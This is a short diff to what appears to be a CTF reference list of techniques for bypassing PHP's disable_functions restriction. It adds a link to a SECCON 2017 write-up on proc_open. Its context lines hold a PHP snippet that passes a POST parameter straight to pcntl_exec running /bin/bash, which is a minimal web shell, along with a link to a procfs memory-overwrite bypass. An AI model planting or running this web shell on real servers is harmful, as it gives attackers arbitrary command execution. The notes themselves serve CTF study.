@@ -147,6 +147,9 @@ $args = array('-c', $_POST['c']);
 print_r($args); // next line would return HTTP 500 without this line (?!)
 pcntl_exec('/bin/bash', $args);
 
+* howto use proc-open
+https://github.com/p4-team/ctf/tree/master/2017-12-09-seccon-quals/web_automatic
+
 * bypass disable_functions by overwriting memory through the procfs - plaidctf-2014 nightmares
 http://www.reddit.com/r/netsec/comments/2tyh93/php_disable_functions_procfs_bypass_ru/
 
